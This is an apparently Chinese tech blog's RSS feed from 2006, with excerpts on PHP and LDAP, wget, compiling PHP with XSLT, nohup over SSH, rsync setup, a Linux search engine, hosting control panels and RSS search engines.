      <description>本文将演示如何使用PHP连接一个LDAP服务器。具体的例子是连接到一个公共的LDAP服务器并且进行搜索。这个例子模拟的是Netscape Communicator 4.*，通过自己的地址本连接到LDAP资源。 LDAP介绍
可能不少人已经听说过LDAP，但是却不了解它具体是什么东东和如何工作。在这里我将不会很详细地介绍LDAP，只是对该协议做一个简介。
LDAP是一个用来发布目录信息到许多不同资源的协议。通常它都作为一个集中的地址本使用，不过根据组织者的需要，它可以做得更加强大。
LDAP最基本的形式是一个连接数据库的标准方式。该数据库为读查询作了优化。因此它可以很快地得到查询结果，不过在其它方面，例如更新，就慢得多。要特别注意的是，LDAP通常作为一个hierarchal数据库使用，而不是一个关系数据库。因此，它的结构用树来表示比用表格好。正因为这样，就不能用SQL语句了。
简单说来，LDAP是一个得到关于人或者资源的集中、静态数据的快速方式。
要求
PHPV.4（以前的版本也可以，不过没有经过测试），编译支持LADP，即使用编译时带&amp;ndash;with-ldap公共的LDAP目录。在例子中提供了两个。
例子概览
1.设置公共LDAP服务器的信息 2.创建一个LDAP查询 3.连接到LDAP服务器 4.如果连接成功，处理查询 5.格式化输出 6.关闭连接 7.设计搜索界面的HTML表格 8.显示结果
设置公共LDAP服务器的信息
我们要做的第一件事情是定义所有欲搜索的LDAP服务器的信息
&amp;ldquo;LDAP_NAME&amp;rdquo; = 新的LDAP项目的名字 &amp;ldquo;LDAP_SERVER&amp;rdquo; = 新的LDAP项目的IP地址或者主机名 &amp;ldquo;LDAP_ROOT_DN&amp;rdquo; = 新的LDAP项目的根的辨识名
建立LDAP查询
前面已经提到，LDAP查询与SQL查询是不一样的。因此，语句要受到一定的限制，以下是一个基本的例子。
//Create Query $ldap_query = &amp;ldquo;cn=$common&amp;rdquo;;
在我们的例子中，“cn”是我们要进行搜索的属性，而$common是由搜索的form中得到的字符串变量。LDAP的查询语句语句可使用通配符‘*’。例如‘$stanley’将可以找出‘dan stanley’。
连接到LDAP服务器
以下的函数连接到一个LDAP资源，并且将连接的识别号赋给一个变量，就好象连接到一个通常的数据库一样，例如MySQL。
在我们的例子中，“$connect_id”是连接的识别号，$LDAP_SERVER是可能的ldap服务器数组，而$SERVER_ID是由搜索表格得到的LDAP服务器变量。
如果连接成功，处理查询
如果连接成功的话，我们将得到一个有效的LDAP连接识别号，这样我们就可以处理查询。
一旦我们与LDAP服务器建立好连接，我们就必须进行认证。PHP在连接大多数的数据库时，都是通过发送用户名和密码来进行的。不过，在LDAP中，认证是未知的，直到进行一个bind操作。在我们的例子中，“$bind_id”是绑定连接的标识符。我们是通过匿名绑定到公共的LDAP服务器的。因此，在执行ldap_bind()时，只使用连接识别号就可以了，无需其它的参数。
在经过认证后（这里是匿名的），我们就可以使用ldap_search()函数来执行查询，产生的$search_id是我们搜索的连接识别符。
然后，我们使用ldap_get_entries()函数将结果集赋给$result_array变量。这样我们能够以逻辑的方式排列信息，以便显示。 格式化输出
在执行完LDAP搜索后，返回的数据是以查找的顺序排列的。不过我们在排序时没有SQL这样方便，使用ORDER BY语句就可以了。通常多数公共的LDAP目录都没有标准的大小规范。排序是基于字符的ASCII值，我们必须将字符全部格式化为小写，以便按字母的顺序输出。
要特别注意的是，返回的LDAP结果集是一个多维的数组。因此，我们脚本中的$result_array的结构如下：
$result_array[0][&amp;quot;cn&amp;quot;] [0] = &amp;quot;Dannie Stanley&amp;quot; [&amp;quot;dn&amp;quot;] [0] = &amp;quot;uid=dannie,dc=spinweb.net&amp;quot; [&amp;quot;givenname&amp;quot;][0] = &amp;quot;Dannie&amp;quot; [&amp;quot;sn&amp;quot;] [0] = &amp;quot;Stanley&amp;quot; [&amp;quot;mail&amp;quot;] [0] = &amp;quot;danSPAM@spinweb.</description>
    </item>
    
    <item>
      <title>Linux 下网络蜘蛛wget使用</title>
      <link>http://example.org/2006/04/30/linux-e4b88be7bd91e7bb9ce89c98e89b9bwgete4bdbfe794a8/</link>
      <pubDate>Sun, 30 Apr 2006 09:54:17 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/linux-e4b88be7bd91e7bb9ce89c98e89b9bwgete4bdbfe794a8/</guid>
      <description>wget 是linux自带的工具。补丁程序：http://www.smth.edu.cn/bbscon.php?bid=69&amp;amp;id;=118152≈=500
使用举列:
wget -r -np --level=0 -k http://www.cnread.net/cnread1/dnwl/cxsj/c/cyyb/ walker 04-12-21, 09:11 $ wget --help GNU Wget 1.9.1，非交互式的网络文件下载工具。 用法： wget [选项]... [URL]... 长选项必须用的参数在使用短选项时也是必须的。 启动： -V, --version 显示 Wget 的版本并且退出。 -h, --help 打印此帮助。 -b, -background 启动后进入后台操作。 -e, -execute=COMMAND 运行‘.wgetrc’形式的命令。 日志记录及输入文件： -o, --output-file=文件 将日志消息写入到指定文件中。 -a, --append-output=文件 将日志消息追加到指定文件的末端。 -d, --debug 打印调试输出。 -q, --quiet 安静模式(不输出信息)。 -v, --verbose 详细输出模式(默认)。 -nv, --non-verbose 关闭详细输出模式，但不进入安静模式。 -i, --input-file=文件 下载从指定文件中找到的 URL。 -F, --force-html 以 HTML 方式处理输入文件。 -B, --base=URL 使用 -F -i 文件选项时，在相对链接前添加指定的 URL。 下载： -t, --tries=次数 配置重试次数（0 表示无限）。 --retry-connrefused 即使拒绝连接也重试。 -O --output-document=文件 将数据写入此文件中。 -nc, --no-clobber 不更改已经存在的文件，也不使用在文件名后 添加 .</description>
    </item>
    
    <item>
      <title>Linux / Unix Command: wget</title>
      <link>http://example.org/2006/04/30/linux-unix-command-wget/</link>
      <pubDate>Sun, 30 Apr 2006 09:08:31 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/linux-unix-command-wget/</guid>
      <description>NAME wget - GNU Wget Manual SYNOPSIS wget [option]... [URL]... DESCRIPTION GNU Wget is a free utility for non-interactive download of files from the Web. It supports HTTP, HTTPS, and FTP protocols, as well as retrieval through HTTP proxies. Wget is non-interactive, meaning that it can work in the background, while the user is not logged on. This allows you to start a retrieval and disconnect from the system, letting Wget finish the work.</description>
    </item>
    
    <item>
      <title>php4支持xslt</title>
      <link>http://example.org/2006/04/30/php4e694afe68c81xslt/</link>
      <pubDate>Sun, 30 Apr 2006 09:05:44 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/php4e694afe68c81xslt/</guid>
      <description>首先需要下载如下软件包：
sourceforge.net/projects/expat/
从这里下载最新的 expat
我下载的是：expat-2.0.0.tar.gz
www.gingerall.com/charlie/ga/xml/d_sab.xml
从这里下载sablot
我下载的是：Sablot-1.0.2.tar.gz
xmlsoft.org/
从这里下载 libxslt
我下载的是：libxslt-1.1.9.tar.gz
三个包分别解压缩
先来libxslt
./configure &amp;ndash;prefix=/usr/local/libxslt &amp;ndash;with-libxml-prefix=/usr/local/libxml2 &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install
再来expat
./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install
继续sablot
./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install
最后重新编译php
./configure &amp;ndash;prefix=/usr/local/php/ &amp;ndash;enable-force-cgi-redirect &amp;ndash;enable-mbstring=all &amp;ndash;enable-mbregex &amp;ndash;enable-mbstr-enc-trans &amp;ndash;enable-versioning &amp;ndash;enable-trans-sid &amp;ndash;enable-ftp &amp;ndash;with-mysql=/usr/local/mysql/ &amp;ndash;with-apxs2=/usr/local/apache2/bin/apxs &amp;ndash;with-openssl=/usr/local/openssl &amp;ndash;with-soap=yes &amp;ndash;with-curl=http://example.org/usr/local/curl/ &amp;ndash;with-zlib-dir=/usr/local/zlib/ &amp;ndash;with-mcrypt=/usr/local/libmcrypt/ &amp;ndash;with-gd=/usr/local/gd2 &amp;ndash;with-jpeg-dir=/usr &amp;ndash;with-freetype-dir=/usr/local/freetype &amp;ndash;with-ttf &amp;ndash;with-png-dir=/usr &amp;ndash;with-mhash=/usr/local/mhash/ &amp;ndash;with-dom=/usr/local/libxml2 &amp;ndash;with-iconv=/usr/local/libiconv &amp;ndash;enable-xslt &amp;ndash;with-xslt-sablot &amp;ndash;with-xsl=/usr/local/libxslt
make &amp;amp;&amp;amp; make insteall
重新安装zend吧。
over this~~~</description>
    </item>
    
    <item>
      <title>SSH登录linux妙用后台命令</title>
      <link>http://example.org/2006/04/30/sshe799bbe5bd95linuxe5a699e794a8e5908ee58fb0e591bde4bba4/</link>
      <pubDate>Sun, 30 Apr 2006 08:57:23 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/sshe799bbe5bd95linuxe5a699e794a8e5908ee58fb0e591bde4bba4/</guid>
      <description>用SSH管理linux服务器,有时可能要下载点大的软件或者文件包.又或者要打包一个上5G的文件夹,那是多么漫长的等待&amp;hellip;.
更麻烦的是,下载的时候如果SSH 客户端N久没动作会断掉连接,于是下载到一半的东西也会跟着死掉.
当然,你说我可以打开多个SSH客户窗口来操作&amp;hellip;.,那我不得不说,这是个笨办法.
比如我想打包一个文件夹,可以用如下的命令
#tar zcvf file.tar.gz /path/document/*
不想等,就把他放到后台去(后面加个&amp;amp;)
#tar zcvf file.tar.gz /path/document/* &amp;amp;
如果你要回来.就使用fg 命令
我们想当然的,下载也是这样
#wget http://www.phpv.net/file.tar.gz &amp;amp;
但如果你超时或者有事离开而退出SSH 那正在下载的file.tar.gz 文件也会随之停下了&amp;hellip;
怎么办?让我们用nohup 来完成/
NAME nohup - run a command immune to hangups, with output to a non-tty
SYNOPSIS nohup COMMAND [ARG]&amp;hellip; nohup OPTION
DESCRIPTION Run COMMAND, ignoring hangup signals.
--help display this help and exit --version output version information and exit REPORTING BUGS Report bugs to &amp;lt;bug-coreutils@gnu.org&amp;gt;.</description>
    </item>
    
    <item>
      <title>使用rsync来实现文件同步</title>
      <link>http://example.org/2006/04/30/e4bdbfe794a8rsynce69da5e5ae9ee78eb0e69687e4bbb6e5908ce6ada5/</link>
      <pubDate>Sun, 30 Apr 2006 08:57:06 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/e4bdbfe794a8rsynce69da5e5ae9ee78eb0e69687e4bbb6e5908ce6ada5/</guid>
      <description>使用rsync来实现文件同步 部分参考 www.xfocus.net/articles/200107/214.html 先对这个dd进行简介，当你的网站访问量大了，一台服务器承受不住了 那好，这个时候，rsync来了。 rsync -&amp;raquo;&amp;gt; remote synchronize 呵呵，不用解释了吧 第一步，先来下载这个免费的软件。 rsync.samba.org/ 或者 samba.anu.edu.au/rsync 解压缩后，编译很简单
./configure –prefix=/usr/local/rsync &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install 然后先来配置服务端吧 先来编辑服务端配置文件 #vi /etc/rsyncd.conf uid = root gid = root hosts allow = testhost1 hosts deny = 192.168.0.*/24 use chroot = no # 不使用chroot max connections = 10 # 最大连接数为4 pid file = /var/run/rsyncd.pid lock file = /var/run/rsync.lock log file = /var/log/rsyncd.log # 日志记录文件 [sync_files] # 这里是认证的模块名，在client端需要指定 path = /root/sync_files # 需要做镜像的目录 comment = rsync 192.</description>
    </item>
    
    <item>
      <title>基于Linux的搜索引擎实现</title>
      <link>http://example.org/2006/04/30/e59fbae4ba8elinuxe79a84e6909ce7b4a2e5bc95e6938ee5ae9ee78eb0/</link>
      <pubDate>Sun, 30 Apr 2006 08:26:54 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/e59fbae4ba8elinuxe79a84e6909ce7b4a2e5bc95e6938ee5ae9ee78eb0/</guid>
      <description>搜索引擎是为用户提供快速获取网页信息的工具，其主要的功能是系统通过用户输入关键字，检索后端网页数据库，将相关网页的链接和摘要信息反馈给用户。从搜索的范围上一般分为站内网页搜索和全局网页搜索。随着网页数量的急剧增加，搜索引擎已经成为上网查询信息的必须手段，各个大型网站均已经提供网页数据搜索服务，并且出现了许多为大型网站提供专业搜索引擎服务的公司，如为Yahoo提供搜索服务的Google，为新浪网和263等国内网站提供服务的百度公司等。专业的搜索服务费用高而免费的搜索引擎软件基本都是基于英文的检索，所以都不太适合Intranet环境（如校园网等）的需要。 搜索引擎的基本组成一般分为网页收集程序、网页后端数据组织存储、网页数据检索三部分。决定搜索引擎好坏的关键因素是数据查询的响应时间，即如何组织好满足全文检索需要的大量网页数据。 GNU/Linux作为一个优秀的网络操作系统，其发行版本中集成了大量的网络应用软件，如 Web服务器（Apache ＋ PHP）、目录服务器（OpenLDAP）、脚本语言（Perl）、网页收集程序（Wget）等。所以，通过将它们集中进行应用，便可以实现一个简单、高效的搜索引擎服务器。 一、基本组成和使用方法 1、网页数据收集 Wget程序是一个优秀的网页收集程序，它采用多线程设计能够方便地将网站内容镜像到本地目录中，并且能够灵活定制收集网页的类型、递归收集层次、目录限额、收集时间等。通过专用的收集程序完成网页的收集工作，既降低了设计的难度又提高了系统的性能。为了减小本地数据的规模，可只收集能够查询的html文件、txt文件、脚本程序asp和php只使用缺省的结果，而不收集如图形文件或是其他的数据文件。 2、网页数据过滤 由于html文件中存在大量的标记，如
等，这些标记数据没有实际的搜索价值，所以加入数据库前必须对收集的数据进行过滤。Perl作为广泛使用的脚本语言，拥有非常强大而丰富的程序库，可以方便地完成网页的过滤。通过使用HTML-Parser库可以方便地提取出网页中包含的文字数据、标题数据、链接数据等。该程序库可以在www.cpan.net中下载，并且该网站收集的Perl程序涉及范围之广，远远超出我们的现象。 3、目录服务 目录服务是针对大量数据检索需要开发的服务，最早出现在X.500协议集中，后来扩展到TCP/IP中发展成为LDAP（Lightweight Directory Acess Protocol）协议，其相关的标准为1995年制定的RFC1777和1997年制定的RFC2251等。LDAP协议已经作为工业标准被Sun、Lotus、微软等公司广泛应用到其相关产品中，但是专用的基于Windows平台的目录服务器却较少见，OpenLDAP是免费的运行于Unix系统的目录服务器，其产品的性能优秀，已经被许多的Linux发行版本收集（Redhat、Mandrake等），并且提供了包括C、Perl、PHP等的开发接口。 使用目录服务技术代替普通的关系数据库作为网页数据的后端存取平台主要基于目录服务的技术优势。目录服务简化了数据处理类型，去掉了通用关系数据库的费时的事务机制，而是采用全局替换的策略对数据进行更新，其应用的重点是大量数据的检索服务（一般数据更新和检索的频率比例要求在1:10以上），强调检索速度和全文查询，提供完整的数据备份，非常适合搜索引擎之类服务的需要。从目录服务技术解决问题的重点不难看出其在数据检索上的优势，它的提出时间远远落后于关系数据库的提出时间，实际上反映了根据具体问题优化数据解决方案的原则。这与目前广泛存在的凡是涉及大量数据处理必选SQL Server的处理方法形成鲜明对比。 通过选用成熟的目录服务技术提高网页查询的效率，能够简洁有效地提高数据处理能力。这也充分显示了GNU/Linux系统运行开放软件的优势，毕竟不能方便地获得运行于其他平台的目录服务器。 4、查询程序设计 搜索引擎的前端界面是网页，用户通过在特定的网页中输入关键字提交给Web服务器进行处理。运行在Apache Web服务器上的PHP脚本通过运行其相关ldap函数便可以执行关键字的查询工作。主要进行的工作是根据关键字构造查询、向目录服务器提交查询、显示查询结果等。Linux + Apache + PHP作为广泛使用Web服务器，与WinNT + IIS + ASP相比其性能毫不逊色，在目前的Linux发行版本中都集成了Apache + PHP 以及缺省的ldap、pgsql、imap等模块。 5、计划任务 搜索引擎的网页数据收集、数据过滤、加入目录数据库等工作都应该是自动完成的，在UNIX系统中有cron进程来专门完成按照特定时间调度任务，为了不影响系统的运行，一般可以把这些工作安排到深夜进行。 二、具体步骤和注意事项 1、配置Wget软件 在RedHat 6.2发行版中已经集成了该软件包，可以直接进行安装。将需要镜像的站点地址编辑为一个文件中，通过 -I 参数读入该文件；为镜像的站点指定一个本地下载目录；为了避免内部网中链接的重复引用，一般只镜像该站点内的数据；还可以根据网站的具体情况，指定其镜像的深度。 2、配置Openldap服务 在RedHat 6.2发行版中已经集成了Openldap-1.2.9，其配置文件存放在/etc/openldap的目录中。主要的配置文件是slapd.conf，关键要打开对检索速度至关重要的index选项，可以使用setup工具，将ldap在系统引导后作为缺省服务启动。 Ldap服务可以通过文本文件方式存放数据，即LDIF文件格式。使用此方式可以高效地更新目录服务数据，需要注意LDIF格式是通过空行对数据进行分隔的，并且通过运行ldif2lbm将LDIF格式数据导入目录数据库中时需要暂停目录服务。 3、编制数据过滤和LDIF文件生成脚本 为了方便地过滤网页数据，可以调用Perl的HTML-Parser库函数，该程序包下载后需要进行编译，在eg目录下生成了相关的htext，htitle程序，在Perl中可以通过调用外部程序的方式运行该程序，并对其过滤结果通过重定向的方法生成临时文件。本搜索引擎设计的目录数据属性有dn、link、title、modifydate、contents，其中的dn通过Link进行唯一性标识，将过滤后的网页文本内容通过/usr/sbin/ldif程序进行自动编码后放入LDIF文件中。 基本的LDIF文件格式如下： dn: dc=27jd,dc=zzb objectclass: top objectclass: organization  dn: link= http://freemail.27jd.zzh/index.html, dc=27jd ,dc=zzb link: http://freemail.27jd.zzh/index.html title: Webmail主页 modifydate: 2001年2月8日 contents:: CgpXZWJtYWls1vfSswoKCgoKIKHvoaG7ttOtyrnTw1dlYm1haWzPtc2zoaGh7yDO0t KqyerH69PKz+QhISFPdXRsb29rxeTWw6O6U01UUDogZnJlZW1haWwuMjdqZC56emJQ T1AzOiBmcm VlbWFpbC4yN2pkLnp6YkROUyA6IDExLjk5LjY0Ljiy4srU08O7p6O6bWFpbGd1ZXN00 8O7p7/awe 6jum1haWxndWVzdNLR16Ky4dPDu6cg08O7p8P7OkAgZnJlZW1haWwuMjdqZC56emK/ 2sHuOqChoa AgIKHyzOG5qbf+zvEgofKzo7z7zsrM4iCh8s2o0bbCvKHyICCh8sq1z9bUrcDtIKHywfTR1 LK+of IgofK8vMr1sr/W99Kzsb7Ptc2z08nK1NHpvLzK9bK/zfjC59bQ0MS9qMGius3OrLukCgoK CqAKCg o= objectclass:webpage  基本的slapd.</description>
    </item>
    
    <item>
      <title>开源或免费虚拟主机管理系统</title>
      <link>http://example.org/2006/04/30/e5bc80e6ba90e68896e5858de8b4b9e8999ae68b9fe4b8bbe69cbae7aea1e79086e7b3bbe7bb9f/</link>
      <pubDate>Sun, 30 Apr 2006 04:28:14 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/e5bc80e6ba90e68896e5858de8b4b9e8999ae68b9fe4b8bbe69cbae7aea1e79086e7b3bbe7bb9f/</guid>
      <description>ZPanel - 在Windows下的免费Hosting Panel 网址： http://sourceforge.net/projects/zpanel/ http://www.thezpanel.com/
中文讨论： http://www.twftp.org/phpbb/viewtopic.php?t=3104
web-cp - *nix的虚拟主机管理 网址： http://sourceforge.net/projects/webcp/ http://www.web-cp.net/
中文讨论： http://www.twftp.org/phpbb/viewtopic.php?t=5095
VHCS - Virtual Hosting Control System - 一样是*nix系统的，不过比ZPanel还热门喔 网址： http://sourceforge.net/projects/vhcs/ http://www.vhcs.net/
其他的：
http://sourceforge.net/search/?words=hosting
webmin的虚拟主机管理模块virtualmin- -
webmin是一个可运行于Linux/freebsd的web界面的主机管理系统，本身自带以及有人贡献了不少模块
而virtualmin则是它的一个虚拟主机管理模块，功能如下图：
webmin官方站： http://www.webmin.com/ virtaulmin站点： http://www.swelltech.com/virtualmin/
基于php/mysql的虚拟主机控制程序PHPMyWebHosting- -
PHPMyWebHosting是个开源的，基于php/mysql的虚拟主机控制面板程序，你可以用它建立带有邮箱，mysql支持的多域名虚拟主机 它须建立在Linux/freebsd之上，不支持windows
安装phpmywebhosting你必须拥有系统管理员(root)权限，并依次安装以下套件：
MySQL Apache and PHP Postfix Maildrop Courier ProFTPd PHPMyWebHosting
官方站上有基于各平台详细的安装说明 http://www.ladse.de
phpmywebhosting下载：http://www.ladse.de/index.php/Files
SysCP虚拟主机管理系统[全php版]- -
1.有中文包 2.admin,reseller,client 三级管理 3.全部为php代码构成 4.有不少模块(modules)供选择安装 5.开源，免费（基于GPL） 6.Linux/bsd环境，特别是debian(最初是专为它开发的)
是德国人写的，有简体中文,英文,法文，德文语言包，是多语言的
用户界面：
管理员界面：
具有以下特性：
Customer Interface managing email accounts managing email forwarders managing subdomains managing mysql databases managing additional ftp account managing .</description>
    </item>
    
    <item>
      <title>开源的主机管理系统/虚拟主机控制面板</title>
      <link>http://example.org/2006/04/30/e5bc80e6ba90e79a84e4b8bbe69cbae7aea1e79086e7b3bbe7bb9fe8999ae68b9fe4b8bbe69cbae68ea7e588b6e99da2e69dbf/</link>
      <pubDate>Sun, 30 Apr 2006 04:15:04 +0000</pubDate>
      
      <guid>http://example.org/2006/04/30/e5bc80e6ba90e79a84e4b8bbe69cbae7aea1e79086e7b3bbe7bb9fe8999ae68b9fe4b8bbe69cbae68ea7e588b6e99da2e69dbf/</guid>
      <description>搜索引擎是为用户提供快速获取网页信息的工具，其主要的功能是系统通过用户输入关键字，检索后端网页数据库，将相关网页的链接和摘要信息反馈给用户。从搜索的范围上一般分为站内网页搜索和全局网页搜索。随着网页数量的急剧增加，搜索引擎已经成为上网查询信息的必须手段，各个大型网站均已经提供网页数据搜索服务，并且出现了许多为大型网站提供专业搜索引擎服务的公司，如为Yahoo提供搜索服务的Google，为新浪网和263等国内网站提供服务的百度公司等。专业的搜索服务费用高而免费的搜索引擎软件基本都是基于英文的检索，所以都不太适合Intranet环境（如校园网等）的需要。 搜索引擎的基本组成一般分为网页收集程序、网页后端数据组织存储、网页数据检索三部分。决定搜索引擎好坏的关键因素是数据查询的响应时间，即如何组织好满足全文检索需要的大量网页数据。 GNU/Linux作为一个优秀的网络操作系统，其发行版本中集成了大量的网络应用软件，如 Web服务器（Apache ＋ PHP）、目录服务器（OpenLDAP）、脚本语言（Perl）、网页收集程序（Wget）等。所以，通过将它们集中进行应用，便可以实现一个简单、高效的搜索引擎服务器。 一、基本组成和使用方法 1、网页数据收集 Wget程序是一个优秀的网页收集程序，它采用多线程设计能够方便地将网站内容镜像到本地目录中，并且能够灵活定制收集网页的类型、递归收集层次、目录限额、收集时间等。通过专用的收集程序完成网页的收集工作，既降低了设计的难度又提高了系统的性能。为了减小本地数据的规模，可只收集能够查询的html文件、txt文件、脚本程序asp和php只使用缺省的结果，而不收集如图形文件或是其他的数据文件。 2、网页数据过滤 由于html文件中存在大量的标记，如
等，这些标记数据没有实际的搜索价值，所以加入数据库前必须对收集的数据进行过滤。Perl作为广泛使用的脚本语言，拥有非常强大而丰富的程序库，可以方便地完成网页的过滤。通过使用HTML-Parser库可以方便地提取出网页中包含的文字数据、标题数据、链接数据等。该程序库可以在www.cpan.net中下载，并且该网站收集的Perl程序涉及范围之广，远远超出我们的现象。 3、目录服务 目录服务是针对大量数据检索需要开发的服务，最早出现在X.500协议集中，后来扩展到TCP/IP中发展成为LDAP（Lightweight Directory Acess Protocol）协议，其相关的标准为1995年制定的RFC1777和1997年制定的RFC2251等。LDAP协议已经作为工业标准被Sun、Lotus、微软等公司广泛应用到其相关产品中，但是专用的基于Windows平台的目录服务器却较少见，OpenLDAP是免费的运行于Unix系统的目录服务器，其产品的性能优秀，已经被许多的Linux发行版本收集（Redhat、Mandrake等），并且提供了包括C、Perl、PHP等的开发接口。 使用目录服务技术代替普通的关系数据库作为网页数据的后端存取平台主要基于目录服务的技术优势。目录服务简化了数据处理类型，去掉了通用关系数据库的费时的事务机制，而是采用全局替换的策略对数据进行更新，其应用的重点是大量数据的检索服务（一般数据更新和检索的频率比例要求在1:10以上），强调检索速度和全文查询，提供完整的数据备份，非常适合搜索引擎之类服务的需要。从目录服务技术解决问题的重点不难看出其在数据检索上的优势，它的提出时间远远落后于关系数据库的提出时间，实际上反映了根据具体问题优化数据解决方案的原则。这与目前广泛存在的凡是涉及大量数据处理必选SQL Server的处理方法形成鲜明对比。 通过选用成熟的目录服务技术提高网页查询的效率，能够简洁有效地提高数据处理能力。这也充分显示了GNU/Linux系统运行开放软件的优势，毕竟不能方便地获得运行于其他平台的目录服务器。 4、查询程序设计 搜索引擎的前端界面是网页，用户通过在特定的网页中输入关键字提交给Web服务器进行处理。运行在Apache Web服务器上的PHP脚本通过运行其相关ldap函数便可以执行关键字的查询工作。主要进行的工作是根据关键字构造查询、向目录服务器提交查询、显示查询结果等。Linux + Apache + PHP作为广泛使用Web服务器，与WinNT + IIS + ASP相比其性能毫不逊色，在目前的Linux发行版本中都集成了Apache + PHP 以及缺省的ldap、pgsql、imap等模块。 5、计划任务 搜索引擎的网页数据收集、数据过滤、加入目录数据库等工作都应该是自动完成的，在UNIX系统中有cron进程来专门完成按照特定时间调度任务，为了不影响系统的运行，一般可以把这些工作安排到深夜进行。 二、具体步骤和注意事项 1、配置Wget软件 在RedHat 6.2发行版中已经集成了该软件包，可以直接进行安装。将需要镜像的站点地址编辑为一个文件中，通过 -I 参数读入该文件；为镜像的站点指定一个本地下载目录；为了避免内部网中链接的重复引用，一般只镜像该站点内的数据；还可以根据网站的具体情况，指定其镜像的深度。 2、配置Openldap服务 在RedHat 6.2发行版中已经集成了Openldap-1.2.9，其配置文件存放在/etc/openldap的目录中。主要的配置文件是slapd.conf，关键要打开对检索速度至关重要的index选项，可以使用setup工具，将ldap在系统引导后作为缺省服务启动。 Ldap服务可以通过文本文件方式存放数据，即LDIF文件格式。使用此方式可以高效地更新目录服务数据，需要注意LDIF格式是通过空行对数据进行分隔的，并且通过运行ldif2lbm将LDIF格式数据导入目录数据库中时需要暂停目录服务。 3、编制数据过滤和LDIF文件生成脚本 为了方便地过滤网页数据，可以调用Perl的HTML-Parser库函数，该程序包下载后需要进行编译，在eg目录下生成了相关的htext，htitle程序，在Perl中可以通过调用外部程序的方式运行该程序，并对其过滤结果通过重定向的方法生成临时文件。本搜索引擎设计的目录数据属性有dn、link、title、modifydate、contents，其中的dn通过Link进行唯一性标识，将过滤后的网页文本内容通过/usr/sbin/ldif程序进行自动编码后放入LDIF文件中。 基本的LDIF文件格式如下： dn: dc=27jd,dc=zzb objectclass: top objectclass: organization  dn: link= http://freemail.27jd.zzh/index.html, dc=27jd ,dc=zzb link: http://freemail.27jd.zzh/index.html title: Webmail主页 modifydate: 2001年2月8日 contents:: CgpXZWJtYWls1vfSswoKCgoKIKHvoaG7ttOtyrnTw1dlYm1haWzPtc2zoaGh7yDO0t KqyerH69PKz+QhISFPdXRsb29rxeTWw6O6U01UUDogZnJlZW1haWwuMjdqZC56emJQ T1AzOiBmcm VlbWFpbC4yN2pkLnp6YkROUyA6IDExLjk5LjY0Ljiy4srU08O7p6O6bWFpbGd1ZXN00 8O7p7/awe 6jum1haWxndWVzdNLR16Ky4dPDu6cg08O7p8P7OkAgZnJlZW1haWwuMjdqZC56emK/ 2sHuOqChoa AgIKHyzOG5qbf+zvEgofKzo7z7zsrM4iCh8s2o0bbCvKHyICCh8sq1z9bUrcDtIKHywfTR1 LK+of IgofK8vMr1sr/W99Kzsb7Ptc2z08nK1NHpvLzK9bK/zfjC59bQ0MS9qMGius3OrLukCgoK CqAKCg o= objectclass:webpage  基本的slapd.</description>
    </item>
    
    <item>
      <title>RSS搜索引擎集锦</title>
      <link>http://example.org/2006/04/27/rsse6909ce7b4a2e5bc95e6938ee99b86e994a6/</link>
      <pubDate>Thu, 27 Apr 2006 06:26:15 +0000</pubDate>
      
      <guid>http://example.org/2006/04/27/rsse6909ce7b4a2e5bc95e6938ee99b86e994a6/</guid>
      <description>有些用户将RSS搜索误认为“博客搜索”。虽然很多博客网站提供RSS聚合功能（自动创建聚合是大多数博客软件的特征），但并不是所有博客网站均提供这项服务。此外，理论上RSS可应用于任何基于Web类型的内容。RSS从根本来讲还是一种相对简单的规范，它利用了XML，并遵循一种标准的方式来组织和安排网络内容。
事实已经证明，博客可以提供大部分RSS内容。此外，新闻网站同样也可以通过RSS实现内容聚合。大部分新闻站点已经实现这一功能。
并且RSS聚合将被更多地应用于其他类型的内容。譬如，用户可以利用RSS聚合获得天气预报、公司新闻及金融信息、包裹跟踪等等方面的信息。甚至一直以来倍受人们推崇的雅虎目录也已经实现了RSS聚合。
尽管理论上存在着上百万聚合内容，但要从中找到自己有用的相关的信息却非易事。一方面，主要搜索引擎均开始涉足聚合搜索，但截至目前还未有一家推出完善的聚合搜索服务。另一方面虽然也有一些规模较小、专业的博客和聚合搜索引擎，但由于它们缺少内容资源，同时博客和聚合内容中充斥着大量垃圾信息通常导致他们的搜索结果相关性极低。
RSS搜索引擎
互联网上已经诞生并发展起许多专业RSS搜索引擎，以下仅列决几个较为知名的聚合搜索引擎，更多可参考http://allrss.com/rsssearch.html
Bloglines（http://www.bloglines.com）
搜索引擎Ask Jeeves旗下的Bloglines，既是一个聚合搜索工具，又是一款聚合阅读器/新闻聚合器。Bloglines主页右上角放置了两个搜索框，用户可在第一个搜索框的下拉菜单中选择搜索范围，比如所有Bloglines索引的博客，个人订阅的博客，全部网站，或添加一个聚合地址至个人订阅；第二个搜索框则输入关键字。
Bloglines的高级搜索页面，提供有基于表格的简单布尔逻辑搜索功能，还可以按照流行度或日期过滤搜索结果，选择不同的搜索范围（所有博客、个人定制博客或个人定制博客意外的所有博客）。
Bloglines网站上公布了其已经被收录文章的总量，截至2005年9月8日为701,667,885。
此外，作为一款阅读器，Bloglines在聚合内容阅读，管理个人订阅等方面还有很多好用的特色功能。它集信息订阅、分享、发布和搜索于一体，相对于其他同类产品极具个性。
BlogPulse （http://www.blogpulse.com）
BlogPulse主要作为一卷跟踪博客世界的流行趋势和热门话题的工具而众所周知，实际上它还有一款很不错的聚合搜索引擎，同时它还拥有同类聚合搜索服务中最大的聚合内容索引库之一。BlogPulse网站上目前公布的索引量为，可确认博客网页15,870,290个。
BlogPulse的高级搜索页面提供有短语搜索，分别按照“包含全部关键字”、“包含任意一个关键字”和“精确关键字”三个选项，此外你还可以在这里创建自己的布尔算子搜索请求。另外，你还可以按照指定时间范围限制搜索结果，以时间或相关性排列搜索结果。
Daypop（http://www.daypop.com）
